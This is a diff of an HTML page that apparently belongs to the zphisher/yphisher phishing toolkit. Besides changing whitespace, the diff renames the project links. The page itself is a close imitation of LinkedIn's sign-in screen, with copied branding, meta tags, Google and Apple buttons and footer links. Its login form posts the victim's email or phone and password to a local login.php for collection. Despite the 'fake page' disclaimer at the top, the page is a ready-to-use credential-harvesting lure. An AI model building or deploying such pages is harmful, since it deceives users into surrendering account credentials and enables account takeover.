@@ -1,36 +1,35 @@
-
 <!-- 
     Warning: This is just a Fake Page. Beaware of Phishing!
-    Learn More: https://github.com/htr-tech/zphisher#disclaimer
+    Learn More: https://github.com/htr-tech/yphisher#disclaimer
 
-    Page Source: https://github.com/htr-tech/zphisher
+    Page Source: https://github.com/htr-tech/yphisher
     GPL-3.0 license (Don't Copy paste without credits)
 -->
 
 <!-- Thanks to Ali Milani Amin [https://github.com/AliMilani/fake-linkedin/] -->
 <!DOCTYPE html>
 <html lang=en-US class=artdeco>
-    <meta charset=utf-8>
-    <meta http-equiv=X-UA-Compatible content="IE=EDGE">
-    <meta name=viewport content="width=device-width, initial-scale=1">
-    <title>LinkedIn Login, Sign in | LinkedIn</title>
-    <meta name=description content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
-    <meta name=robots content=noarchive>
-    <meta property=og:site_name content=LinkedIn>
-    <meta property=og:title content="LinkedIn Login, Sign in | LinkedIn">
-    <meta property=og:description content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
-    <link rel="stylesheet" href="style.css" />
-    <link rel=canonical href=https://www.linkedin.com/login>
-    <link rel=alternate hreflang=x-default href=https://www.linkedin.com/login>
-    <link rel="shortcut icon" href=favicon.ico>
-    <meta property=og:image content=favicon.ico>
-    <meta property=og:type content=website>
-    <meta property=og:url content=https://www.linkedin.com />
-    <meta name=twitter:card content=summary>
-    <meta name=twitter:site content=@linkedin>
-    <meta name=twitter:title content="LinkedIn Login, Sign in | LinkedIn">
-    <meta name=twitter:description content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
-    <meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
+<meta charset=utf-8>
+<meta http-equiv=X-UA-Compatible content="IE=EDGE">
+<meta name=viewport content="width=device-width, initial-scale=1">
+<title>LinkedIn Login, Sign in | LinkedIn</title>
+<meta name=description content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
+<meta name=robots content=noarchive>
+<meta property=og:site_name content=LinkedIn>
+<meta property=og:title content="LinkedIn Login, Sign in | LinkedIn">
+<meta property=og:description content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
+<link rel="stylesheet" href="style.css" />
+<link rel=canonical href=https://www.linkedin.com/login>
+<link rel=alternate hreflang=x-default href=https://www.linkedin.com/login>
+<link rel="shortcut icon" href=favicon.ico>
+<meta property=og:image content=favicon.ico>
+<meta property=og:type content=website>
+<meta property=og:url content=https://www.linkedin.com />
+<meta name=twitter:card content=summary>
+<meta name=twitter:site content=@linkedin>
+<meta name=twitter:title content="LinkedIn Login, Sign in | LinkedIn">
+<meta name=twitter:description content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
+<meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
 
 <body class=system-fonts style=padding-top:0px>
     <div id=app__container>
@@ -51,35 +50,29 @@
                         <h1 class=header__content__heading>Sign in</h1>
                         <p class=header__content__subheading>Stay updated on your professional world</p>
                     </div>
-                    
+
                     <form method=post class=login__form action=login.php>
                         <div class="form__input--floating mt-24">
-                            <input id=username name=session_key 
-                                type=text aria-describedby=error-for-username 
-                                required validation=email|tel autofocus
-                                aria-label="Email or Phone" value>
-                                <label class=form__label--floating for=username aria-hidden=true>Email or Phone</label>
-                                <div error-for=username id=error-for-username class="form__label--error hidden sf-hidden" role=alert aria-live=assertive></div>
+                            <input id=username name=session_key type=text aria-describedby=error-for-username required validation=email|tel autofocus aria-label="Email or Phone" value>
+                            <label class=form__label--floating for=username aria-hidden=true>Email or Phone</label>
+                            <div error-for=username id=error-for-username class="form__label--error hidden sf-hidden" role=alert aria-live=assertive></div>
                         </div>
-                        
+
                         <div class="form__input--floating mt-24">
-                            <input id="password" type="password"
-                                aria-describedby="error-for-password" name="session_password" required=""
-                                validation="password" class="" aria-label="Password">
-                                <label for="password" class="form__label--floating" aria-hidden="true">Password</label>
-                                <span id="password-visibility-toggle" class="button__password-visibility">show</span>
-                                <div error-for="password" id="error-for-password" class="form__label--error hidden" role="alert" aria-live="assertive"></div>
+                            <input id="password" type="password" aria-describedby="error-for-password" name="session_password" required="" validation="password" class="" aria-label="Password">
+                            <label for="password" class="form__label--floating" aria-hidden="true">Password</label>
+                            <span id="password-visibility-toggle" class="button__password-visibility">show</span>
+                            <div error-for="password" id="error-for-password" class="form__label--error hidden" role="alert" aria-live="assertive"></div>
                         </div>
                         <a href="#" class="btn__tertiary--medium forgot-password" data-cie-control-urn=forgot-password-btn>Forgot password?</a>
                         <div class=login__form_action_container>
                             <button class="btn__primary--large from__button--floating" data-litms-control-urn=login-submit type=submit aria-label="Sign in">Sign in</button>
                         </div>
                     </form>
-                    
+
                     <div class=alternate-signin-container>
                         <div id=or-separator class="or-separator mt-12 snapple-seperator"><span class=or-text>or</span>
-                        </div><button id=sign-in-with-google-button class="alternate-signin__btn mt-12" type=button
-                            aria-label="Sign in with Google"><svg xmlns=http://www.w3.org/2000/svg width=22 height=24
+                        </div><button id=sign-in-with-google-button class="alternate-signin__btn mt-12" type=button aria-label="Sign in with Google"><svg xmlns=http://www.w3.org/2000/svg width=22 height=24
                                 viewBox="0 0 22 24" fill=none>
                                 <path fill-rule=evenodd clip-rule=evenodd
                                     d="M12.1354 5.75C14.0004 5.75 15.4794 6.396 16.4204 7.33L19.0744 4.676C17.3544 3 14.9584 2 12.1354 2C8.1984 2 4.8554 4.148 3.1704 7.302L6.2004 9.7C7.0974 7.39 9.3304 5.75 12.1354 5.75Z"
@@ -93,77 +86,63 @@
                                 <path fill-rule=evenodd clip-rule=evenodd
                                     d="M22 11.9896C22 11.3086 21.931 10.6436 21.801 9.9996H12V13.9996H18.062L18.018 14.2496C17.784 15.4466 17.068 16.5606 15.811 17.3086L18.788 19.6656C20.818 17.9056 22 15.2466 22 11.9896Z"
                                     fill=#547DBE></path>
-                            </svg><span class=btn-text>Sign in with Google</span></button><button
-                            class=sign-in-with-apple-button type=button aria-label="Sign in with Apple"><svg width=24
+                            </svg><span class=btn-text>Sign in with Google</span></button><button class=sign-in-with-apple-button type=button aria-label="Sign in with Apple"><svg width=24
                                 height=24 viewBox="0 2 24 24" fill=none xmlns=http://www.w3.org/2000/svg>
                                 <rect width=24 height=24 fill=transparent></rect>
                                 <path
                                     d="M17.569 12.6254C17.597 15.652 20.2179 16.6592 20.247 16.672C20.2248 16.743 19.8282 18.1073 18.8662 19.5166C18.0345 20.735 17.1714 21.9488 15.8117 21.974C14.4756 21.9986 14.046 21.1799 12.5185 21.1799C10.9915 21.1799 10.5142 21.9489 9.2495 21.9987C7.93704 22.0485 6.93758 20.6812 6.09906 19.4673C4.38557 16.9842 3.0761 12.4508 4.83438 9.39061C5.70786 7.87092 7.26882 6.90859 8.96311 6.88391C10.2519 6.85927 11.4683 7.753 12.2562 7.753C13.0436 7.753 14.5219 6.67821 16.0759 6.83605C16.7265 6.8632 18.5527 7.09947 19.7253 8.81993C19.6309 8.87864 17.5463 10.095 17.569 12.6254ZM15.058 5.1933C15.7548 4.34789 16.2238 3.171 16.0959 2C15.0915 2.04046 13.877 2.67085 13.1566 3.5158C12.5109 4.26404 11.9455 5.46164 12.0981 6.60946C13.2176 6.69628 14.3612 6.03925 15.058 5.1933Z"
                                     fill=black></path>
-                            </svg><span class=sign-in-with-apple-button__text>Sign in with Apple</span></button><code
-                            id=appleSignInLibScriptPath style=display:none></code><code
-                            id=i18nErrorAppleSignInGeneralErrorMessage style=display:none></code><code
-                            id=googleGSILibPath style=display:none></code><code id=useGoogleGSILibraryTreatment
-                            style=display:none></code>
+                            </svg><span class=sign-in-with-apple-button__text>Sign in with Apple</span></button><code id=appleSignInLibScriptPath style=display:none></code><code id=i18nErrorAppleSignInGeneralErrorMessage style=display:none></code>
+                        <code
+                            id=googleGSILibPath style=display:none></code><code id=useGoogleGSILibraryTreatment style=display:none></code>
                     </div>
                 </div>
                 <div id=otp-div class="hidden sf-hidden"></div>
             </div>
-            <div class=join-now>New to LinkedIn? <a
-                    href="https://www.linkedin.com/signup/cold-join?source=guest_homepage-basic_nav-header-signin"
-                    class=btn__tertiary--medium id=join_now data-litms-control-urn=login_join_now
-                    data-cie-control-urn=join-now-btn>Join now</a></div>
+            <div class=join-now>New to LinkedIn? <a href="https://www.linkedin.com/signup/cold-join?source=guest_homepage-basic_nav-header-signin" class=btn__tertiary--medium id=join_now data-litms-control-urn=login_join_now data-cie-control-urn=join-now-btn>Join now</a></div>
         </main>
 
         <script type="text/javascript">
-            setTimeout(function () {
+            setTimeout(function() {
                 try {
                     var h = document.getElementById('password-visibility-toggle');
-                    h.onclick = function () {
+                    h.onclick = function() {
                         var p = document.getElementById('password');
                         if (p.type === 'password') {
                             p.type = 'text';
-                            h.innerHTML='hide';
+                            h.innerHTML = 'hide';
                         } else {
                             p.type = 'password';
-                            h.innerHTML='show';
+                            h.innerHTML = 'show';
                         }
                     }
-                } catch (e) { }
+                } catch (e) {}
             }, 200);
         </script>
-  
+
         <!-- Footer -->
         <footer class=footer__base role=contentinfo>
             <div class=footer__base__wrapper>
                 <p class=copyright>
-                    <li-icon type=linkedin-logo size=14dp alt=LinkedIn color aria-hidden=true><svg
-                            preserveAspectRatio="xMinYMin meet" focusable=false>
+                    <li-icon type=linkedin-logo size=14dp alt=LinkedIn color aria-hidden=true><svg preserveAspectRatio="xMinYMin meet" focusable=false>
                         </svg></li-icon><em><span class=a11y__label>LinkedIn</span>© 2022</em>
-                <div>
-                    <ul class=footer__base__nav-list aria-label="Footer Legal Menu">
-                        <li><a
-                                href="https://www.linkedin.com/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement">User
+                    <div>
+                        <ul class=footer__base__nav-list aria-label="Footer Legal Menu">
+                            <li><a href="https://www.linkedin.com/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement">User
                                 Agreement</a>
-                        <li><a
-                                href="https://www.linkedin.com/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy">Privacy
+                                <li><a href="https://www.linkedin.com/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy">Privacy
                                 Policy</a>
-                        <li><a
-                                href="https://www.linkedin.com/help/linkedin/answer/34593?lang=en&amp;trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines">Community
+                                    <li><a href="https://www.linkedin.com/help/linkedin/answer/34593?lang=en&amp;trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines">Community
                                 Guidelines</a>
-                        <li><a
-                                href="https://www.linkedin.com/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy">Cookie
+                                        <li><a href="https://www.linkedin.com/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy">Cookie
                                 Policy</a>
-                        <li><a
-                                href="https://www.linkedin.com/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy">Copyright
+                                            <li><a href="https://www.linkedin.com/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy">Copyright
                                 Policy</a>
-                        <li id=feedback-request><a
-                                href="https://www.linkedin.com/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&amp;lang=en"
-                                target=_blank rel="nofollow noreferrer noopener">Send Feedback</a>
-                        <li>
-                            <div class=language-selector>
-                                <div class="language-selector__dropdown hidden sf-hidden"></div>
-                                <button class=language-selector__button aria-expanded=false>
+                                                <li id=feedback-request><a href="https://www.linkedin.com/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&amp;lang=en" target=_blank rel="nofollow noreferrer noopener">Send Feedback</a>
+                                                    <li>
+                                                        <div class=language-selector>
+                                                            <div class="language-selector__dropdown hidden sf-hidden"></div>
+                                                            <button class=language-selector__button aria-expanded=false>
                                     <spanclass=language-selector__label-text>Language</span>
                                     <i class=language-selector__label-icon>
                                         <svg viewBox="0 0 16 16" width=16 height=16 preserveAspectRatio="xMinYMin meet" xmlns=http://www.w3.org/2000/svg>
@@ -171,9 +150,9 @@
                                         </svg>
                                     </i>
                                 </button>
-                            </div>
-                    </ul>
-                </div>
+                                                        </div>
+                        </ul>
+                    </div>
             </div>
         </footer>
     </div>
